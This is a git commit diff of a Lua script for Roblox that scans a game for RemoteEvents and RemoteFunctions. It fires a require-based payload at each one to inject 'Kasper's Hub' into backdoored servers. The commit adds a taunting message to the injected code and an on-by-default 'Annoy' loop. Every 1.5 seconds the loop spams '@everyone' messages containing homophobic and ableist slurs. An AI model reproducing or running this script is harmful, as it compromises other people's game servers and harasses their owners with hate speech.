54c93d7fa1bed8f6df50ecf1a5ff53054e679051
jaackksiscool <93211307+jaackkiscool@users.noreply.github.com>
2022-06-11 10:51:16 +0300

    Update backdoorscanner.lua

--- backdoorscanner.lua
+++ backdoorscanner.lua
@@ -1,25 +1,49 @@
 --[[
 backdoorscanner.lua
-This will inject a Require Script to randomly find RemoteEvent/RemoteFunction that handles executing Require Scripts and fire Kasper's Hub inject it.
+This will search for random located RemoteEvents/RemoteFunctions that handles Require Script execution code and inject Kasper's hub into it.
 Bitwise#4908
 ]]
 local RemoteFunctionsEnabled = false -- Change to true if you want to Invoke RemoteFunctions. (Might sometimes work)
-local code = [[require(9039886698).tristytn(']]..game.Players.LocalPlayer.Name..[[')]] -- This will load the Kasper's Hub but if you know how to change this feel free to.
-local blacklisted = {'emma','__FUNCTION'}
-for i,v in pairs(game:GetDescendants()) do
+local Annoy = true -- If you want to massively spam their webhook and annoy them enable this
+local code = "require(9039886698).tristytn('" .. game.Players.LocalPlayer.Name .. "')" -- This will load the Kasper's Hub but if you know how to change this feel free to.
+local blacklisted = {"emma", "__FUNCTION"}
+for i, v in pairs(game:GetDescendants()) do
     if v:IsA("RemoteEvent") then
-       for index, value in pairs(blacklisted) do
-          if v.Name ~= value then
-             v:FireServer(code)
-          end
-       end
-if RemoteFunctionsEnabled then
-    elseif v:IsA("RemoteFunction") then
-         for index, value in pairs(blacklisted) do
-             if v.Name ~= value then
-                 v:InvokeServer(code)
-                 end
-             end
-         end
+        for index, value in pairs(blacklisted) do
+            if v.Name ~= value then
+                local Troll =
+                    "--[[ Hey, " ..
+                    v:GetFullName() ..
+                        " nice " ..
+                            typeof(v) ..
+                                " you got there! Unfortunately, I already injected into your " ..
+                                    v:GetFullName() .. "]] \n" .. code
+                v:FireServer(Troll)
+                if Annoy then
+                    while wait(1.5) do
+                        v:FireServer(
+                            "@everyone, Hello retarded faggots, me " ..
+                                game.Players.LocalPlayer.Name .. " the superior of this! 😈"
+                        )
+                    end
+                end
+            end
+        end
+        if RemoteFunctionsEnabled then
+        elseif v:IsA("RemoteFunction") then
+            for index, value in pairs(blacklisted) do
+                if v.Name ~= value then
+                    v:InvokeServer(code)
+                    if Annoy then
+                        while wait(1.5) do
+                            v:InvokeServer(
+                                "@everyone, Hello retarded faggots, me " ..
+                                    game.Players.LocalPlayer.Name .. " the superior of this! 😈"
+                            )
+                        end
+                    end
+                end
+            end
+        end
     end
 end
